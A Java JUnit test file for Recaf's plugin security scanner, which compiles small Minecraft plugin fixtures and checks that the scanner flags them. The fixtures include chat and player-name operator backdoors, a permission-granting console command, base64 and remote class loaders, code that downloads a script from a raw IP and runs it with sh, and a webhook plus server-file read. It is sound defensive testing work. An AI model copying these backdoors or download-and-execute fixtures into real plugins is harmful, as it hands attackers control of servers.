package software.coley.recaf.services.analysis.plugin.security;

import jakarta.annotation.Nonnull;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import software.coley.recaf.info.StubFileInfo;
import software.coley.recaf.info.builder.JvmClassInfoBuilder;
import software.coley.recaf.services.compile.CompilerDiagnostic;
import software.coley.recaf.services.compile.CompilerResult;
import software.coley.recaf.services.compile.JavacArgumentsBuilder;
import software.coley.recaf.services.compile.JavacCompiler;
import software.coley.recaf.test.TestBase;
import software.coley.recaf.workspace.model.BasicWorkspace;
import software.coley.recaf.workspace.model.Workspace;
import software.coley.recaf.workspace.model.bundle.BasicJvmClassBundle;
import software.coley.recaf.workspace.model.resource.WorkspaceFileResource;
import software.coley.recaf.workspace.model.resource.WorkspaceFileResourceBuilder;
import software.coley.recaf.workspace.model.resource.WorkspaceResource;
import software.coley.recaf.workspace.model.resource.WorkspaceResourceBuilder;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests for {@link PluginSecurityScanner}, against small plugins compiled with javac: backdoors and loaders that must
 * be reported as critical, and an ordinary plugin using the same APIs in legitimate ways that must not be.
 */
class PluginSecurityScannerTest extends TestBase {
	private static final Map<String, String> SOURCES = new LinkedHashMap<>();
	private static Map<String, byte[]> compiled;

	static {
		api("org/bukkit/command/CommandSender", "public interface CommandSender { String getName(); }");
		api("org/bukkit/command/ConsoleCommandSender", "public interface ConsoleCommandSender extends CommandSender {}");
		api("org/bukkit/entity/Player", """
				public interface Player extends org.bukkit.command.CommandSender {
					void setOp(boolean op);
					java.util.UUID getUniqueId();
					org.bukkit.permissions.PermissionAttachment addAttachment(org.bukkit.plugin.Plugin plugin, String name, boolean value);
				}""");
		api("org/bukkit/permissions/PermissionAttachment", "public class PermissionAttachment {}");
		api("org/bukkit/plugin/Plugin", "public interface Plugin { String getName(); }");
		api("org/bukkit/plugin/PluginManager", "public interface PluginManager { void disablePlugin(Plugin plugin); Plugin getPlugin(String name); }");
		api("org/bukkit/plugin/java/JavaPlugin", """
				public abstract class JavaPlugin implements org.bukkit.plugin.Plugin {
					public java.io.File getDataFolder() { return null; }
					public String getName() { return null; }
				}""");
		api("org/bukkit/scheduler/BukkitScheduler", "public interface BukkitScheduler { void runTask(org.bukkit.plugin.Plugin plugin, Runnable task); }");
		api("org/bukkit/Bukkit", """
				public final class Bukkit {
					public static org.bukkit.scheduler.BukkitScheduler getScheduler() { return null; }
					public static org.bukkit.command.ConsoleCommandSender getConsoleSender() { return null; }
					public static org.bukkit.plugin.PluginManager getPluginManager() { return null; }
					public static boolean dispatchCommand(org.bukkit.command.CommandSender sender, String command) { return false; }
				}""");
		api("org/bukkit/event/Listener", "public interface Listener {}");
		api("org/objectweb/asm/ClassWriter", "public class ClassWriter { public ClassWriter(int flags) {} public byte[] toByteArray() { return null; } }");
		api("org/bukkit/event/EventHandler", """
				@java.lang.annotation.Retention(java.lang.annotation.RetentionPolicy.RUNTIME)
				public @interface EventHandler {}""");
		api("org/bukkit/event/player/AsyncPlayerChatEvent", """
				public class AsyncPlayerChatEvent {
					public org.bukkit.entity.Player getPlayer() { return null; }
					public String getMessage() { return null; }
					public void setCancelled(boolean cancel) {}
				}""");
		api("org/bukkit/event/player/PlayerJoinEvent", "public class PlayerJoinEvent { public org.bukkit.entity.Player getPlayer() { return null; } }");

		// Grants operator from chat, through a scheduled lambda as real backdoors do, since setOp must run on the main thread.
		plugin("chat/Backdoor", """
				import org.bukkit.Bukkit;
				import org.bukkit.event.*;
				import org.bukkit.event.player.AsyncPlayerChatEvent;
				public class Backdoor implements Listener {
					private final org.bukkit.plugin.Plugin plugin;
					public Backdoor(org.bukkit.plugin.Plugin plugin) { this.plugin = plugin; }
					@EventHandler
					public void a(AsyncPlayerChatEvent event) {
						if (event.getMessage().startsWith("#")) {
							event.setCancelled(true);
							Bukkit.getScheduler().runTask(plugin, () -> grant(event));
						}
					}
					private void grant(AsyncPlayerChatEvent event) { event.getPlayer().setOp(true); }
				}""");
		// Recognizes its author by name and grants everything.
		plugin("player/Backdoor", """
				import org.bukkit.Bukkit;
				import org.bukkit.event.*;
				import org.bukkit.event.player.PlayerJoinEvent;
				public class Backdoor implements Listener {
					@EventHandler
					public void a(PlayerJoinEvent event) {
						if (event.getPlayer().getName().equals("Notch2"))
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + event.getPlayer().getName() + " permission set *");
					}
				}""");
		plugin("hidden/Loader", """
				public class Loader extends ClassLoader {
					private static final String PAYLOAD = "yv66vgAAADQ=";
					public Class<?> load() {
						byte[] code = java.util.Base64.getDecoder().decode(PAYLOAD);
						return defineClass(null, code, 0, code.length);
					}
				}""");
		plugin("remote/Loader", """
				public class Loader extends ClassLoader {
					public Class<?> load() throws Exception {
						try (var in = new java.net.URL("https://cdn.example.net/payload.bin").openStream()) {
							byte[] code = in.readAllBytes();
							return defineClass(null, code, 0, code.length);
						}
					}
				}""");
		plugin("remote/Exec", """
				public class Exec {
					public void run() throws Exception {
						java.nio.file.Path file = java.nio.file.Path.of("x");
						try (var in = new java.net.URL("http://45.13.22.9/x.sh").openStream()) {
							java.nio.file.Files.copy(in, file);
						}
						Runtime.getRuntime().exec(new String[]{"sh", file.toString()});
					}
				}""");
		plugin("infect/Spreader", """
				public class Spreader extends org.bukkit.plugin.java.JavaPlugin {
					public void spread() throws Exception {
						java.io.File plugins = getDataFolder().getParentFile();
						for (java.io.File jar : plugins.listFiles())
							try (var out = new java.util.jar.JarOutputStream(new java.io.FileOutputStream(jar + ".tmp"))) {
								out.putNextEntry(new java.util.zip.ZipEntry("a.class"));
							}
					}
				}""");
		plugin("exfil/Stealer", """
				public class Stealer {
					static final String HOOK = "https://discord.com/api/webhooks/1414687448352686285/AbCdEfGhIjKlMnOpQr";
					public byte[] read() throws Exception { return java.nio.file.Files.readAllBytes(java.nio.file.Path.of("server.properties")); }
				}""");
		// Downloads database drivers and loads them, as many legitimate plugins do.
		plugin("libs/LibraryLoader", """
				public class LibraryLoader {
					public ClassLoader load(java.io.File dir) throws Exception {
						java.io.File jar = new java.io.File(dir, "mysql.jar");
						try (var in = new java.net.URL("https://repo1.maven.org/maven2/com/mysql/mysql-connector-j/9.0.0/mysql-connector-j-9.0.0.jar").openStream()) {
							java.nio.file.Files.copy(in, jar.toPath());
						}
						return new java.net.URLClassLoader(new java.net.URL[]{jar.toURI().toURL()}, getClass().getClassLoader());
					}
				}""");
		// The same APIs as above, used the way ordinary plugins use them.
		plugin("clean/CleanPlugin", """
				import org.bukkit.Bukkit;
				import org.bukkit.event.*;
				import org.bukkit.event.player.*;
				public class CleanPlugin extends org.bukkit.plugin.java.JavaPlugin implements Listener {
					private String rewardCommand;
					@EventHandler
					public void onChat(AsyncPlayerChatEvent event) {
						if (event.getMessage().contains("badword")) {
							event.setCancelled(true);
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), rewardCommand.replace("%player%", event.getPlayer().getName()));
						}
					}
					@EventHandler
					public void onJoin(PlayerJoinEvent event) { event.getPlayer().setOp(false); }
					public boolean hasVault() {
						org.bukkit.plugin.Plugin vault = Bukkit.getPluginManager().getPlugin("Vault");
						return vault != null && vault.getName().equals("Vault");
					}
					public void selfDisable() { Bukkit.getPluginManager().disablePlugin(this); }
					public void save() throws Exception {
						java.nio.file.Files.writeString(new java.io.File(getDataFolder(), "data.yml").toPath(), "x");
						java.io.File own = new java.io.File("plugins/CleanPlugin/config.yml");
					}
					public Class<?> nms() throws Exception { return Class.forName("net.minecraft.server.MinecraftServer"); }
					public String checkUpdate() throws Exception {
						try (var in = new java.net.URL("https://api.spigotmc.org/legacy/update.php?resource=1").openStream()) {
							return new String(in.readAllBytes());
						}
					}
				}""");
		plugin("clean/Metrics", """
				public class Metrics {
					public Metrics(org.bukkit.plugin.java.JavaPlugin plugin) {
						java.io.File config = new java.io.File(new java.io.File(plugin.getDataFolder().getParentFile(), "bStats"), "config.yml");
					}
				}""");
		// Calibration cases from real plugins, which must not be reported as more than they are.
		plugin("calibrate/SenderWrapper", """
				public class SenderWrapper {
					private final org.bukkit.entity.Player delegate;
					public SenderWrapper(org.bukkit.entity.Player delegate) { this.delegate = delegate; }
					public void setOp(boolean value) { delegate.setOp(value); }
				}""");
		plugin("calibrate/FastAccessor", """
				public class FastAccessor extends ClassLoader {
					public Class<?> generate() {
						byte[] code = new org.objectweb.asm.ClassWriter(0).toByteArray();
						return defineClass(null, code, 0, code.length);
					}
				}""");
		plugin("calibrate/IsolatedLoader", """
				public class IsolatedLoader extends ClassLoader {
					public Class<?> defineClass(String name, byte[] code) { return defineClass(name, code, 0, code.length); }
				}""");
		plugin("calibrate/Hooks", """
				public class Hooks {
					static final String EXAMPLE = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
					static final String PREFIX = "https://discord.com/api/webhooks/";
					static final String LAN = "http://192.168.1.10:8080/status";
				}""");
		plugin("calibrate/depend/mongodb/Helper", """
				public class Helper { public void run() throws Exception { new ProcessBuilder("mongocryptd").start(); } }""");
		// A loader that reads where to download from a paste, then defines the downloaded classes in another class.
		plugin("split/Core", """
				public class Core {
					public byte[] fetch() throws Exception {
						String location;
						try (var in = new java.net.URL("https://pastebin.com/raw/EVQABwGt").openStream()) { location = new String(in.readAllBytes()); }
						try (var in = new java.net.URL(location).openStream()) { return in.readAllBytes(); }
					}
				}""");
		plugin("split/MemoryLoader", """
				public class MemoryLoader extends ClassLoader {
					public Class<?> load(byte[] code) { return defineClass(null, code, 0, code.length); }
				}""");
		plugin("splitnet/Updater", """
				public class Updater {
					public byte[] fetch() throws Exception {
						try (var in = new java.net.URL("https://example.org/module.bin").openStream()) { return in.readAllBytes(); }
					}
				}""");
		plugin("splitnet/ModuleLoader", """
				public class ModuleLoader extends ClassLoader {
					public Class<?> load(byte[] code) { return defineClass(null, code, 0, code.length); }
				}""");
		for (int i = 0; i < 25; i++)
			plugin("strings/C" + i, "public class C" + i + " { static String s(String in) { return new String(java.util.Base64.getDecoder().decode(in)); } }");
	}

	@BeforeAll
	static void compile() {
		CompilerResult result = recaf.get(JavacCompiler.class).compile(new JavacArgumentsBuilder()
				.withClassSources(SOURCES)
				.withVersionTarget(17)
				.build(), null, null);
		if (!result.wasSuccess())
			fail("Fixture did not compile:\n" + result.getDiagnostics().stream()
					.map(CompilerDiagnostic::toString).collect(Collectors.joining("\n")));
		compiled = result.getCompilations();
	}

	@Test
	void chatHandlerGrantingOperatorThroughALambdaIsABackdoor() {
		PluginSecurityReport report = scan("chat/");

		SecurityFinding backdoor = only(report, SecurityRule.CHAT_BACKDOOR);
		assertEquals(Severity.CRITICAL, backdoor.severity());
		assertEquals("chat/Backdoor.a(Lorg/bukkit/event/player/AsyncPlayerChatEvent;)V", backdoor.location().toString());
		assertEquals("AsyncPlayerChatEvent", backdoor.detail());
		assertEquals(SecurityRule.SET_OP, backdoor.evidence().getFirst().rule());
		assertEquals("grant", backdoor.evidence().getFirst().location().memberName(), "Evidence should point at the call");
		assertEquals(Severity.CRITICAL, report.highest());
	}

	@Test
	void hardcodedPlayerGrantingPermissionsIsABackdoor() {
		PluginSecurityReport report = scan("player/");

		assertEquals("Notch2", only(report, SecurityRule.HARDCODED_PLAYER).detail());
		assertEquals("lp user … permission set *", only(report, SecurityRule.PRIVILEGE_COMMAND).detail());
		SecurityFinding backdoor = only(report, SecurityRule.PLAYER_BACKDOOR);
		assertEquals("Notch2", backdoor.detail());
		assertTrue(report.ofRule(SecurityRule.CONSOLE_COMMAND).isEmpty(), "Privileged commands are reported as such");
	}

	@Test
	void definingDecodedClassesIsHiddenCode() {
		PluginSecurityReport report = scan("hidden/");

		SecurityFinding hidden = only(report, SecurityRule.HIDDEN_CODE);
		assertEquals("hidden/Loader", hidden.location().toString());
		assertEquals(List.of(SecurityRule.DEFINE_CLASS, SecurityRule.DECODE),
				hidden.evidence().stream().map(SecurityFinding::rule).toList());
		assertTrue(report.ofRule(SecurityRule.REMOTE_CODE).isEmpty());
	}

	@Test
	void definingDownloadedClassesIsRemoteCode() {
		SecurityFinding remote = only(scan("remote/Loader"), SecurityRule.REMOTE_CODE);

		assertEquals("cdn.example.net", remote.detail(), "The host should be named");
	}

	@Test
	void runningADownloadedProgramIsRemoteExecution() {
		PluginSecurityReport report = scan("remote/Exec");

		only(report, SecurityRule.REMOTE_EXEC);
		assertEquals("http://45.13.22.9/x.sh", only(report, SecurityRule.SUSPICIOUS_URL).detail(), "Raw IPs are suspicious");
	}

	@Test
	void rewritingJarsInThePluginsFolderIsAnInfection() {
		PluginSecurityReport report = scan("infect/");

		assertEquals("getDataFolder().getParentFile()", only(report, SecurityRule.PLUGINS_FOLDER).detail());
		assertEquals(Severity.CRITICAL, only(report, SecurityRule.JAR_INFECTION).severity());
	}

	@Test
	void webhooksAndServerFilesAreReported() {
		PluginSecurityReport report = scan("exfil/");

		assertEquals("https://discord.com/api/webhooks/1414687448352686285/AbCdEfGhIjKlMnOpQr", only(report, SecurityRule.SUSPICIOUS_URL).detail());
		assertEquals("server.properties", only(report, SecurityRule.SENSITIVE_FILE).detail());
	}

	@Test
	void downloadingLibrariesIsMediumNotCritical() {
		PluginSecurityReport report = scan("libs/");

		SecurityFinding libraries = only(report, SecurityRule.RUNTIME_LIBRARIES);
		assertEquals(Severity.MEDIUM, libraries.severity());
		assertEquals("repo1.maven.org", libraries.detail());
		assertEquals(Severity.MEDIUM, report.highest());
	}

	@Test
	void ordinaryUsesOfTheSameApisStayLow() {
		PluginSecurityReport report = scan("clean/");

		List<SecurityFinding> notLow = report.findings().stream()
				.filter(f -> f.severity().isAtLeast(Severity.MEDIUM)).toList();
		assertEquals(List.of(), notLow, "A plugin using these APIs normally should only have low findings");
		assertFalse(report.ofRule(SecurityRule.CONSOLE_COMMAND).isEmpty(), "Console commands are still listed");
		assertTrue(report.ofRule(SecurityRule.SET_OP).isEmpty(), "Removing operator is not reported");
		assertTrue(report.ofRule(SecurityRule.COMPUTED_CLASS_NAME).isEmpty(), "Constant class names are not reported");
		assertEquals("api.spigotmc.org", PluginSecurityScannerTest.host(only(report, SecurityRule.URL).detail()));
	}

	@Test
	void repeatedStringDecryptionCollapsesIntoOneFinding() {
		PluginSecurityReport report = scan("strings/");

		assertEquals(List.of(), report.ofRule(SecurityRule.DECODE));
		SecurityFinding encryption = only(report, SecurityRule.STRING_ENCRYPTION);
		assertEquals("25 classes", encryption.detail());
	}

	@Test
	void wrappersForwardingSetOpOrDefineClassAreNotUses() {
		PluginSecurityReport report = scan("calibrate/");

		assertTrue(report.ofRule(SecurityRule.SET_OP).isEmpty(), "A sender wrapper's setOp only forwards");
		assertTrue(report.ofRule(SecurityRule.DEFINE_CLASS).isEmpty(), "Wrappers and generated classes are not hidden code");
		SecurityFinding generated = only(report, SecurityRule.GENERATED_CLASS);
		assertEquals("generate", generated.location().memberName());
	}

	@Test
	void placeholderAndPrivateUrlsAreNotSuspicious() {
		PluginSecurityReport report = scan("calibrate/Hooks");

		assertEquals(List.of(), report.ofRule(SecurityRule.SUSPICIOUS_URL));
		assertEquals(3, report.ofRule(SecurityRule.URL).size(), "They are still listed as URLs");
	}

	@Test
	void relocatedLibrariesAreMarked() {
		SecurityFinding exec = only(scan("calibrate/depend/"), SecurityRule.PROCESS_EXEC);

		assertTrue(exec.library(), "A driver relocated under 'depend/mongodb' is a bundled library");
	}

	@Test
	void downloadingFromAPasteAndDefiningClassesElsewhereIsRemoteCode() {
		PluginSecurityReport report = scan("split/");

		SecurityFinding remote = only(report, SecurityRule.REMOTE_CODE);
		assertEquals(Severity.CRITICAL, remote.severity());
		assertEquals("pastebin.com", remote.detail());
		assertEquals("split/MemoryLoader", remote.location().toString());
		assertTrue(report.ofRule(SecurityRule.DOWNLOADS_AND_DEFINES).isEmpty());
	}

	@Test
	void downloadingAndDefiningClassesElsewhereIsHigh() {
		PluginSecurityReport report = scan("splitnet/");

		assertEquals(Severity.HIGH, only(report, SecurityRule.DOWNLOADS_AND_DEFINES).severity());
		assertTrue(report.ofRule(SecurityRule.REMOTE_CODE).isEmpty());
	}

	@Test
	void classesInEmbeddedJarsAreScannedAndMarked() {
		WorkspaceFileResource inner = new WorkspaceFileResourceBuilder()
				.withFileInfo(new StubFileInfo("lib/inner.jar"))
				.withJvmClassBundle(bundle("remote/Exec"))
				.build();
		WorkspaceResource outer = new WorkspaceResourceBuilder()
				.withJvmClassBundle(bundle("hidden/"))
				.withEmbeddedResources(Map.of("lib/inner.jar", inner))
				.build();
		PluginSecurityReport report = PluginSecurityScanner.scan(new BasicWorkspace(outer), false);

		assertEquals(List.of("lib/inner.jar"), report.embeddedJars());
		assertEquals("lib/inner.jar", only(report, SecurityRule.REMOTE_EXEC).embeddedIn());
		assertNull(only(report, SecurityRule.HIDDEN_CODE).embeddedIn());
	}

	@Test
	void findingsAreOrderedMostSevereFirst() {
		PluginSecurityReport report = scan("");

		for (int i = 1; i < report.findings().size(); i++)
			assertTrue(report.findings().get(i - 1).severity().isAtLeast(report.findings().get(i).severity()),
					"Out of order at " + i);
		assertEquals(Severity.CRITICAL, report.findings().getFirst().severity());
	}

	@Nonnull
	private static PluginSecurityReport scan(@Nonnull String prefix) {
		Workspace workspace = new BasicWorkspace(new WorkspaceResourceBuilder().withJvmClassBundle(bundle(prefix)).build());
		return PluginSecurityScanner.scan(workspace, false);
	}

	@Nonnull
	private static BasicJvmClassBundle bundle(@Nonnull String prefix) {
		BasicJvmClassBundle bundle = new BasicJvmClassBundle();
		compiled.forEach((name, bytecode) -> {
			if (!name.startsWith("org/") && name.startsWith(prefix))
				bundle.initialPut(new JvmClassInfoBuilder(bytecode).build());
		});
		assertFalse(bundle.isEmpty(), "No fixture classes for " + prefix);
		return bundle;
	}

	@Nonnull
	private static SecurityFinding only(@Nonnull PluginSecurityReport report, @Nonnull SecurityRule rule) {
		List<SecurityFinding> findings = report.ofRule(rule);
		assertEquals(1, findings.size(), () -> "Expected one " + rule + " in:\n" + report.findings().stream()
				.map(f -> f.rule() + " " + f.location() + " " + f.detail()).collect(Collectors.joining("\n")));
		return findings.getFirst();
	}

	@Nonnull
	private static String host(String url) {
		return java.net.URI.create(url).getHost();
	}

	private static void api(@Nonnull String name, @Nonnull String body) {
		SOURCES.put(name, "package " + name.substring(0, name.lastIndexOf('/')).replace('/', '.') + ";\n" + body);
	}

	private static void plugin(@Nonnull String name, @Nonnull String body) {
		SOURCES.put(name, "package " + name.substring(0, name.lastIndexOf('/')).replace('/', '.') + ";\n" + body);
	}
}
